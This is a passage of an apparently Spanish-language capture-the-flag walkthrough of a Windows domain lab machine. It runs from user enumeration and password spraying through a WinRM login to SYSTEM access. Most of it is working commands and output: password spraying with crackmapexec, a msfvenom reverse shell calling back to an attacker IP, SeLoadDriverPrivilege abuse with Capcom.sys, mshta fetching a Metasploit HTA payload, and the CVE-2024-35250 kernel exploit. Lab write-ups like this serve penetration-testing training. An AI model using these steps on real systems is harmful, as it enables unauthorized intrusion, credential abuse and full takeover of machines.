index: 0xfbd RID: 0x1f5 acb: 0x00000214 Account: Invitado	Name: (null)	Desc: Cuenta integrada para el acceso como invitado al equipo o dominio
index: 0x109a RID: 0x458 acb: 0x00020010 Account: JB	Name: JB	Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Cuenta de servicio de centro de distribución de claves
index: 0x1091 RID: 0x44f acb: 0x00000210 Account: Orujo	Name: Orujo	Desc: (null)
index: 0x109e RID: 0x45c acb: 0x00020010 Account: RedLabel	Name: RedLabel	Desc: (null)
index: 0x1094 RID: 0x452 acb: 0x00000210 Account: Whisky	Name: Whisky	Desc: (null)
index: 0x1099 RID: 0x457 acb: 0x00020010 Account: Whisky2	Name: Whisky2	Desc: (null)
```
Nada, no hay algo que nos ayude.

Revisando los recursos compartidos del **servicio SMB**, recordemos que hay un recurso llamado `PDF Pro Virtual Printer` y que tiene una descripción curiosa.

Se da a entender que hay una impresora conectada y esta la podemos ver desde el **servicio RPC** con el comando **enumprinters**:
```batch
rpcclient $> enumprinters
	flags:[0x800000]
	name:[\\192.168.69.69\Soy Hacker y arreglo impresoras]
	description:[\\192.168.69.69\Soy Hacker y arreglo impresoras,Universal Document Converter,*******]
	comment:[Soy Hacker y arreglo impresoras]
```
Parece que hay una contraseña en la descripción de la impresora.

Podemos probar si le pertenece a algún usuario, pero me doy cuenta de que hay algunos usuarios que no teníamos registrados.

Es posible obtener todos los usuarios con el siguiente comando:
```batch
rpcclient -U "whisky%************" 192.168.69.69 -c "enumdomusers" | awk -F '[][]' '{print $2}'
Administrador
Invitado
krbtgt
DefaultAccount
Orujo
Ginebra
Whisky
Hendrick
Chivas Regal
Whisky2
JB
Chivas
beefeater
CarlosV
RedLabel
Gordons
```
Guarda esta nueva lista de usuarios.

Y con **crackmapexec**, aplicamos **password spraying**:
```bash
crackmapexec smb 192.168.69.69 -u users.txt -p '******'
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Administrador:****** STATUS_LOGON_FAILURE 
...
...
...
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:******
....
....
```
Excelente, encontramos a quien le pertenece este usuario.

Ahora, podríamos probar si podemos hacerlo algo en el **servicio SMB**, pero veamos si podemos usar estas credenciales para entrar al **servicio WinRM**:
```bash
crackmapexec winrm 192.168.69.69 -u 'Chivas Regal' -p ' **************'
SMB         192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)
HTTP        192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] http://192.168.69.69:5985/wsman
WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:********* (Pwn3d!)
```
Funciono.

Vamos a conectarnos con la herramienta **evil-winrm**:
```batch
evil-winrm -i 192.168.69.69 -u 'Chivas Regal' -p '**************'
                                        
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion       
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents>
```
Y estamos dentro.

Aquí podemos encontrar la flag del usuario:
```batch
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Chivas Regal\Desktop> dir

    Directorio: C:\Users\Chivas Regal\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/1/2024  10:29 AM             36 user.txt

*Evil-WinRM* PS C:\Users\Chivas Regal\Desktop> type user.txt
....
```

## Post Explotación {#Post}

### Abusando del Privilegio SeLoadDriverPrivilege para Escalar Privilegios {#Privesc}

Si revisamos nuestros privilegios, veremos uno interesante:
```batch
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents> whoami /priv
.
INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                     Estado
============================= =============================================== ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio        Habilitada
SeLoadDriverPrivilege         Cargar y descargar controladores de dispositivo Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido                Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso    Habilitada
```

Investigando un poco, existe la posibilidad de utilizar el **privilegio SeLoadDriverPrivilege** para escalar privilegios. En el siguiente blog se explica bastante bien el cómo se hace esto:
* <a href="https://www.tarlogic.com/es/blog/explotacion-seloaddriverprivilege/" target="_blank">Abusando SeLoadDriverPrivilege para elevar privilegios</a>

En resumen, este privilegio permite la carga de controladores de kernel maliciosos, pues permite a un usuario con privilegios limitados cargar y administrar controladores del kernel (drivers). 

Si un atacante puede aprovecharse de este privilegio, puede cargar un controlador malicioso firmado o incluso explotar vulnerabilidades en controladores legítimos para ejecutar código en modo kernel (Ring 0), obteniendo así privilegios de SYSTEM/Administrador.

Tenemos dos repositorios que muestran la forma de explotar esta vulnerabilidad:
* <a href="https://github.com/JoshMorrison99/SeLoadDriverPrivilege" target="_blank">Repositorio de JoshMorrison99: SeLoadDriverPrivilege</a>
* <a href="https://github.com/k4sth4/SeLoadDriverPrivilege" target="_blank">Repositorio de k4sth4: SeLoadDriverPrivilege</a>

En mi caso, voy a usar el repositorio de **JoshMorrison99**.

Podemos clonar el repo para empezar a cargar los archivos:
```bash
git clone https://github.com/JoshMorrison99/SeLoadDriverPrivilege.git
Clonando en 'SeLoadDriverPrivilege'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 20 (delta 5), reused 16 (delta 4), pack-reused 0 (from 0)
Recibiendo objetos: 100% (20/20), 270.13 KiB | 1.71 MiB/s, listo.
Resolviendo deltas: 100% (5/5), listo.
```

Ahora, debemos crear una **Reverse Shell** con **msfvenom**:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=Tu_IP LPORT=443 -f exe -o revShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revShell.exe
```

Con esto listo, vamos a cargar todos los archivos, que en total serían 4, a nuestra sesión de **evil-winrm** con el comando **upload**:
```batch
*Evil-WinRM* PS C:\> mkdir Temp
*Evil-WinRM* PS C:\> cd Temp
*Evil-WinRM* PS C:\Temp> upload SeLoadDriverPrivilege-JoshMorrison99/LoadDriver.exe                                        
Info: Uploading /../TheHackersLabs/Pacharan/content/SeLoadDriverPrivilege-JoshMorrison99/LoadDriver.exe to C:\Temp\LoadDriver.exe
Data: 20480 bytes of 20480 bytes copied
Info: Upload successful!
.
*Evil-WinRM* PS C:\Temp> upload SeLoadDriverPrivilege-JoshMorrison99/ExploitCapcom.exe
Info: Uploading /../TheHackersLabs/Pacharan/content/SeLoadDriverPrivilege-JoshMorrison99/ExploitCapcom.exe to C:\Temp\ExploitCapcom.exe
Data: 357716 bytes of 357716 bytes copied
Info: Upload successful!
.
*Evil-WinRM* PS C:\Temp> upload SeLoadDriverPrivilege-JoshMorrison99/Capcom.sys
Info: Uploading /../TheHackersLabs/Pacharan/content/SeLoadDriverPrivilege-JoshMorrison99/Capcom.sys to C:\Temp\Capcom.sys
Data: 14100 bytes of 14100 bytes copied
Info: Upload successful!
.
*Evil-WinRM* PS C:\Temp> upload revShell.exe
Info: Uploading /../TheHackersLabs/Pacharan/content/revShell.exe to C:\Temp\revShell.exe
Data: 9556 bytes of 9556 bytes copied
Info: Upload successful!
```

De acuerdo a las instrucciones, debemos invocar el binario **LoadDriver.exe** junto al archivo **Capcom.sys** y el resultado nos debe dar `NTSTATUS: 00000000, WinError: 0`:
```batch
*Evil-WinRM* PS C:\Temp> .\LoadDriver.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys
RegCreateKeyEx failed: 0x0
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-3046175042-3013395696-775018414-1108\System\CurrentControlSet\MyService
NTSTATUS: 00000000, WinError: 0
```
Parece que funciono.

Vamos a abrir una **netcat** usando **rlwrap**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Por último, ejecutamos el binario **ExploitCapcom.exe** indicándole que ejecute nuestra **Reverse Shell**:
```batch
*Evil-WinRM* PS C:\Temp> .\ExploitCapcom.exe C:\Temp\revShell.exe
[+] Path is: C:\Temp\revShell.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000080
[*] Shellcode was placed at 0000026AEFD30008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
```

Veamos si recibimos algo en la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.69.69] 60134
Microsoft Windows [Versi�n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.
.
C:\Temp>whoami
whoami
nt authority\system
```
Fue un exito.

Ya solo buscamos la flag del administrador:
```batch
C:\Users\Administrador\Desktop>type root.txt
type root.txt
...
```
Con esto completamos la máquina.

### Enumeración de Máquina Windows con Módulo de local_exploit_suggester de Metasploit y Escalando Privilegios con cve_2024_35250_ks_driver {#EnumWin}

Si nosotros quisiéramos utilizar el módulo `post/multi/recon/local_exploit_suggester` de **Metasploit**, necesitaríamos una sesión de **Meterpreter**.

Para obtener esta sesión, necesitamos usar el módulo **HTA Server** que nos dará una URL que usaremos dentro de la sesión de **evil-winrm** junto al comando **mshta.exe**, pues este permite la ejecución de aplicaciones **HTA**.

#### Levantando Servidor HTA y Obteniendo Sesión de Meterpreter {#HTA}

Inicia **Metasploit** y usa el módulo **HTA Server**:
```bash
msfconsole -q
msf6 > use exploit/windows/misc/hta_server
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) >
```

Vamos a configurarlo para que acepte la **arquitectura x64 de Windows** y le configuramos nuestra IP:
```bash
msf6 exploit(windows/misc/hta_server) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > set target 1
target => 1
msf6 exploit(windows/local/bypassuac_comhijack) > set LHOST Tu_IP
LHOST => Tu_IP
```

Lo ejecutamos y copiamos la URL:
```bash
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on Tu_IP:4444 
[*] Using URL: http://Tu_IP:8080/nkP4w3.hta
[*] Server started.
```

Ahora, en la sesión de **evil-winrm**, usamos el comando **mshta.exe** y le agregamos la URL:
```bash
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents> mshta.exe http://Tu_IP:8080/nkP4w3.hta
```

Si revisas **Metasploit**, verás que ya tienes una sesión de **Meterpreter**:
```bash
msf6 exploit(windows/misc/hta_server) > 
[*] 192.168.69.69    hta_server - Delivering Payload
[*] Sending stage (203846 bytes) to 192.168.69.69
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 192.168.69.69:49776) at 2025-02-25 02:13:55 -0600

msf6 exploit(windows/misc/hta_server) > sessions

Active sessions
===============

  Id  Name  Type                     Information                              Connection
  --  ----  ----                     -----------                              ----------
  1         meterpreter x64/windows  PACHARAN\Chivas Regal @ WIN-VRU3GG3DPLJ  Tu_IP:4444 -> 192.168.69.69:49776 (192.168.69.69)
```

#### Utilizando Módulo local_exploit_suggester y Probando Exploit cve_2024_35250_ks_driver {#Suggester}

Vamos a usar el módulo `post/multi/recon/local_exploit_suggester` para obtener una lista de Exploits que nos puedan ayudar a escalar privilegios:
```bash
msf6 exploit(windows/misc/hta_server) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit
[*] 192.168.69.69 - Collecting local exploits for x64/windows...
[*] 192.168.69.69 - 203 exploit checks are being tried...
...
...
...
#   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1607 build detected!
 8   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/cve_2021_40449                           Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1607 build detected!
 11  exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 12  exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2016
 13  exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2016
 14  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 15  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```
Salieron varios Exploits, pero el que nos va a servir será `exploit/windows/local/cve_2024_35250_ks_driver`.

Este Exploit se aprovecha del driver ks.sys que es un componente del **Kernel Streaming (KS)** y se encuentra instalado por defecto en **Windows 10**. Este Exploit pertenece al **CVE-2024-35250**.

Vamos a usarlo:
```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2024_35250_ks_driver
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2024_35250_ks_driver) >
```

Lo configuramos:
```bash
msf6 exploit(windows/local/cve_2024_35250_ks_driver) > set LPORT 5555
LPORT => 5555
msf6 exploit(windows/local/cve_2024_35250_ks_driver) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/cve_2024_35250_ks_driver) > set LHOST Tu_IP
LHOST => Tu_IP
```

Y lo ejecutamos:
```bash
msf6 exploit(windows/local/cve_2024_35250_ks_driver) > exploit
[*] Started reverse TCP handler on Tu_IP:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2016
[*] Launching notepad to host the exploit...
[*] The notepad path is: C:\Windows\System32\notepad.exe
[*] The notepad pid is: 732
[*] Reflectively injecting the DLL into 732...
[*] Sending stage (203846 bytes) to 192.168.69.69
[*] Meterpreter session 4 opened (Tu_IP:5555 -> 192.168.69.69:49820) at 2025-02-25 02:27:20 -0600

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Listo, volvimos a escalar privilegios.
